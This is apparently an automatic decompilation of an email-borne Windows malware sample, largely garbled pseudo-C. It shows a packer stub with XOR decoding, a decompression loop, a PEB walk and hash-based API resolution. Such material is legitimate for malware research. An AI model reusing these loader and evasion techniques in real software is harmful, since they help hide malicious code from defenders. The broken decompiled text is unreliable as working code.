/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_1513/ia32_pe/subject.exe'
 */

stack space not deallocated on return
/*	Procedure: 0x0040102C - 0x0040106D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040102C()
{



    *eax = *eax + al;
    *(ecx + -1174405120) = *(ecx + -1174405120) + cl;
    asm("hlt");
    *eax = *eax + al;
    *eax = *eax + al;
    (save)edx;
    asm("int1");
    esi = esi + 1;
    *eax = *eax + al;
    *eax & eax;
    *eax = *eax & dl;
    eax = eax + 1;
    *eax = *eax + al;
    *(eax + eax) = *(eax + eax) + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *(edx + -1994056640) = *(edx + -1994056640) ^ ecx;
    asm("fidivr word [edi+0x400000]");
    ecx = 151552;
    asm("pushf");
    asm("clc");
    asm("popf");
    asm("rep movsb");
    (save)4260577;
    eax = 0;
    asm("pushf");
    asm("popf");
}

/*	Procedure: 0x0040106E - 0x0040108A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040106E()
{



    *edx = *edx + dh;
    *esi = *esi + ch;
    *(ecx - 27) = *(ecx - 27) + ah;
    edx = edx - 1;
    *L00008900 = *L00008900 + ch;
    *eax = *eax + al;
    *eax = *eax ^ al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    al = 0;
    asm("jpe 0x401083");
}

/* DEST BLOCK NOT FOUND: 00401381 -> 00401419 */
/*	Procedure: 0x0040108B - 0x004013E8
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    esi = !esi;
    ecx = 570425343;
    asm("rol ecx,0x7");
    edi = edi ^ ecx;
    esi = -3815382;
    asm("ror esi,0x7");
    eax = !eax;
    edi = esp;
    eax = 16320;
    asm("ror eax,0x6");
    edx = edx + 76304525;
    edi = edi & eax;
    eax = 155616;
    asm("rol eax,0x3");
    eax = eax + edi;
    esi = esi + *esp;
    edx = *eax;
    asm("Unknown opcode 0xc1");
    asm("lock sbb [edx+0x47],eax");
L004010c5:
    if(*%ss:edx] != ecx) {
        asm("Unknown opcode 0xc1");
        asm("lock adc al,0x36");
L004010d1:
        if(*edx != esi) {
            goto L004010c5;
        }
        edx = edx - 1;
        eax = 1073741826;
        asm("rol eax,0x6");
        if(*edx != al) {
            goto L004010d1;
        }
    } else {
        edx = edx + 4;
        eax = -67108861;
        asm("rol eax,0x6");
        if(*edx != al) {
            eax = eax - -1303591787;
        }
    }
    ecx = ecx & 1432422977;
    edi = *esp;
    asm("ror edx,0x10");
    ecx = edi;
L0040110b:
    ecx = ecx - 1;
    edi = 402653190;
    asm("rol edi,0x5");
    asm("rol esi,0x11");
    if(*%ss:ecx] != edi) {
        eax = eax + 1;
        goto L0040110b;
    }
    edi = !edi;
    eax = *ecx();
    edi = edi >> 23;
    edx = 48;
    asm("rol eax,0x18");
    ecx = ecx ^ 568533209;
    edi = 12;
    esi = *%fs:edx] + 12;
    dx = dx | 105;
    eax = *esi;
    ecx = ecx + ebp;
    edi = *(eax + 28);
    asm("ror si,0x6");
    edx = *edi;
    edi = edi ^ eax;
    ecx = *(edx + 8);
    edx = !edx;
    edi = (edi | -272274918) ^ -2047149774;
    eax = L0040143B(ecx, 414199694);
    edx = 13824;
    asm("ror edx,0x7");
    eax = eax - 1;
    ecx = 909252406;
    asm("rol ecx,0x1");
    (save)edx;
    edx = edx & 1827772842;
    (save)ecx;
    ecx = ecx + ecx;
    esi = -1692852965;
    asm("rol esi,0x2");
    (save)esi;
    edx = edx - 1;
    (save)esp;
    eax = *edi();
    esp = esp + 12;
    edi = edi & 811261371;
    eax = L0040143B(eax, -455416606);
    eax = edi;
    (save)0;
    esi = 0;
    (save)0;
    ecx = 0;
    (save)0;
    (save)13695512;
    (save)-1410007161;
    (save)101;
    eax = *eax();
    ecx = ecx ^ ebx;
    esi = 101;
    ds = 101;
    eax = (eax | -1873172970) ^ 728339373;
    edi = 2581580;
    dx = dx - -23;
    ecx = *L0027644C;
    asm("rol edx,0x13");
    eax = *ecx();
    *eax = *eax | ecx;
    asm("Unknown opcode 0xff");
    asm("Unknown opcode 0xff");
    esi = 35;
    asm("ror edi,0x9");
    ds = esi;
    si = si + 54;
    edi = edi >> 26;
    edx = *%fs:ecx];
    ax = ax | 114;
    edi = *(edx + 12);
    ecx = 49;
    esi = *(edi + 28);
    edi = edi + 1;
    ecx = *esi;
    edi = edi + 1;
    edi = edi + eax;
    ecx = ecx + 8;
    asm("ror dx,0x4");
    eax = *ecx;
    dx = dx | 58;
    edi = edi - 1;
    ebp = eax;
    eax = L0040143B(eax, 367257424);
    (save)152480;
    eax = 64;
    (save)64;
    eax = *edi();
    ebx = eax;
    eax = eax - -151557;
    asm("clc");
    *eax = ebp;
    asm("clc");
    eax = L0040143B(ebp, 414199694);
    eax = ebx;
    asm("cmc");
    eax = eax + 151574;
    asm("cmc");
    *eax = edi;
    L0040143B(ebp, 1656591764);
    *(ebx + 151590) = edi;
    eax = L0040143B(ebp, 1265524511);
    edx = esp;
    asm("wait");
    (save)edx + -102;
    ecx = 64;
    (save)64;
    eax = 4194304;
    (save) *( *L0040003C + 4194304 + 80);
    (save)4194304;
    eax = *edi();
    asm("wait");
    edi = 0x40107f;
    esi = *L0040107F;
    edx = 0;
    asm("pushf");
    asm("popf");
    ecx = 47758;
    edi = 4194643 + esi;
    dl = *edi;
    asm("pushf");
    asm("cld");
    asm("popf");
    if(edx != 0) {
        dl = dl ^ 241;
        asm("pushf");
        asm("wait");
        asm("popf");
        if(edx != 0) {
            *edi = dl;
            asm("pushf");
            asm("cld");
            asm("popf");
        }
        asm("pushf");
        asm("cld");
        asm("popf");
    }
    edi = edi + 1;
    asm("loop 0x4012da");
    asm("pusha");
    asm("pushf");
    asm("cmc");
    asm("popf");
    edi = ebx;
    esi = *L0040107F + 4194643;
    asm("pushf");
    asm("cmc");
    asm("popf");
    asm("cld");
    dl = 128;
    asm("pushf");
    asm("cmc");
    asm("popf");
    ebx = 0;
L00401318:
    *edi = *esi;
    edi = edi + 1;
    bl = 2;
L0040131b:
    L004013E9();
    if(esi = esi + 1) {
        goto L00401318;
    }
    ecx = 0;
    L004013E9();
    >= ? L00401366 : ;
    eax = 0;
    eax = L004013E9();
    >= ? L0040137d : ;
    bl = 2;
    al = 16;
L00401345:
    asm("wait");
    eax = L004013E9();
    asm("adc al,al");
    asm("fnop");
    asm("wait");
    if(ecx = ecx + 1) {
        goto L00401345;
    }
    asm("wait");
    != ? 0x4013d0 : ;
    *edi = al;
    edi = edi + 1;
    asm("fnop");
    goto L0040131b;
    eax = L00401402();
    if(!(ecx = ecx - ebx)) {
        L004013FD();
        goto L004013c9;
        al = *esi;
        eax = eax >> 1;
        if(esi = esi + 1) {
            goto L00401419;
        }
        asm("adc ecx,ecx");
    } else {
        asm("xchg eax,ecx");
        eax = eax - 1 << 8;
        al = *esi;
        esi = esi + 1;
        eax = L004013FD();
        asm("pushf");
        asm("wait");
        asm("popf");
        if(eax < 32000) {
            asm("pushf");
            asm("stc");
            asm("popf");
            if(ah >= 5) {
                goto L004013c4;
            }
            if(eax > 127) {
                goto L004013c5;
            }
        }
    }
    asm("pushf");
    asm("popf");
    ecx = ecx + 1;
L004013c4:
    ecx = ecx + 1;
L004013c5:
    asm("pushf");
    asm("cmc");
    asm("popf");
    asm("xchg eax,ebp");
L004013c9:
    eax = ebp;
    bl = 1;
    asm("pushf");
    asm("stc");
    asm("popf");
    (save)esi;
    asm("pushf");
    asm("cmc");
    asm("popf");
    esi = edi;
    asm("pushf");
    asm("popf");
    esi = esi - eax;
    asm("rep movsb");
    asm("pushf");
    asm("cld");
    asm("popf");
    (restore)esi;
    asm("pushf");
    asm("clc");
    asm("popf");
    goto L0040131b;
}

/* DEST BLOCK NOT FOUND: 004013ee -> 004013fc */
/*	Procedure: 0x004013E9 - 0x004013FC
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004013E9()
{



    asm("pushf");
    asm("cmc");
    asm("popf");
    if(!(dl = dl + dl)) {
        dl = *esi;
        esi = esi + 1;
        asm("pushf");
        asm("cmc");
        asm("popf");
        asm("adc dl,dl");
    }
}

/*	Procedure: 0x004013FD - 0x00401401
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004013FD()
{



    ecx = 0;
    asm("pushf");
    asm("wait");
    asm("popf");
}

stack space not deallocated on return
/*	Procedure: 0x00401402 - 0x0040143A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401402()
{



    asm("pushf");
    asm("cld");
    asm("popf");
    do {
        L004013E9();
        asm("adc ecx,ecx");
        eax = L004013E9();
    } while(ecx = ecx + 1);
    return;
    asm("pushf");
    asm("wait");
    asm("popf");
    asm("popa");
    eax = L0040151B();
    asm("cmc");
    esi = 0x401052;
    asm("stc");
    edi = 151552 + ebx;
    asm("cld");
    (save)edi;
    ecx = 28;
    asm("rep movsb");
}

/*	Procedure: 0x0040143B - 0x0040151A
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 16
 */

L0040143B(A14, A18)
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  eax;
	/* unknown */ void  ecx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffffc;



    asm("ror cx,0x2");
    eax = A14;
    A18 = eax;
    ecx = ecx >> 19;
    eax = eax + 85 + -25;
    esi = esi ^ -1050419615;
    ecx = *eax;
    esi = A18 - -99 - -21;
    asm("stc");
    ecx = *(esi + ecx) - -38;
    asm("cmc");
    esi = ecx - 10 + A18;
    asm("clc");
    edi = *esi + A18;
    esi = esi + 4;
    ecx = *esi + A18;
    asm("cld");
    esi = esi + 4;
    asm("cmc");
    eax = *esi;
    asm("cld");
    eax = eax + A18;
    asm("wait");
    (save)eax;
    (save)edi;
    (save)ecx;
    asm("cmc");
    asm("cld");
    edi = ecx;
    (restore)ecx;
    ecx = 0;
    asm("cmc");
    (save)ecx;
    asm("wait");
    eax = A14;
    esi = eax;
    eax = eax + *edi;
    asm("cmc");
    for(ecx = 0; 1; asm("clc");) {
        cl = cl + *eax;
        asm("cmc");
        asm("ror ecx,0x17");
        ecx = ecx ^ 1200148887;
        eax = eax + 1;
        if(*eax != 0) {
            continue;
        }
        if((ecx ^ A18) == 0) {
            break;
        }
        (restore)ecx;
        asm("cld");
        ecx = ecx + 1;
        asm("clc");
        (save)ecx;
        edi = edi - -4;
        eax = *edi + esi;
        ecx = 0;
    }
    asm("clc");
    (restore)A18;
    eax = Vfffffffc + (A18 << 1);
    ecx = *eax & 65535;
    asm("stc");
    ecx = ecx << 2;
    eax = *esp;
    asm("cld");
    eax = eax + ecx;
    (restore)A18;
    edi = *eax;
    (restore)A18;
    edi = edi + esi;
}

/*	Procedure: 0x0040151B - 0x00401647
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040151B()
{



    asm("pusha");
    asm("clc");
    edx = ebx;
    esi = -356628945;
    asm("wait");
    esi = (esi ^ -356551393) + edx;
    asm("clc");
    for(*(ebx + 151609) = edx; 1; esi = esi + 20) {
        eax = *(esi + 12);
        if(eax == 0) {
            break;
        }
        (save)esi;
        asm("wait");
        (save)eax;
        ecx = *(esi + 16);
        eax = ebx;
        asm("clc");
        *(eax - -151640) = ecx;
        edi = *esi;
        *(ebx + 151620) = edi;
        asm("wait");
        if(edi == 0) {
            edi = *(esi + 16);
        }
        edx = *(ebx + 151609);
        asm("cmc");
        (restore)eax;
        edi = edi + edx;
        asm("cmc");
        *(ebx + 151657) = edi;
        (save)edi;
        (save)eax + edx;
        eax = *(ebx + 151574);
        asm("wait");
        eax = *eax();
        for(*(ebx - -151673) = eax; 1; *(ebx - -151657) = edx) {
            eax = *( *(ebx + 151657));
            if(eax == 0) {
                break;
            }
            asm("wait");
            if(!(eax & -2147483648)) {
                asm("cld");
                if(!(eax = eax - -2)) {
                    goto L004015c7;
                }
                edx = *(ebx - -151609);
                asm("stc");
                eax = eax + edx;
            } else {
L004015c7:
                eax = eax & 2147483647;
            }
            (save)eax;
            (save) *(ebx + 151673);
            asm("clc");
            edi = *( *(ebx + 151590))();
            edx = *(ebx - -151640);
            *(edx + *(ebx + 151609)) = edi;
            asm("clc");
            edx = *(ebx + 151640) - -4;
            *(ebx - -151640) = edx;
            asm("cld");
            edx = *(ebx + 151657);
            asm("cmc");
            edx = edx - -4;
        }
        esp = esp + 4;
        (restore)esi;
        asm("cmc");
    }
    asm("stc");
    asm("popa");
}

/*	Procedure: 0x00401648 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401648()
{



}

/* address  size  */
/* 0x0040108b       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
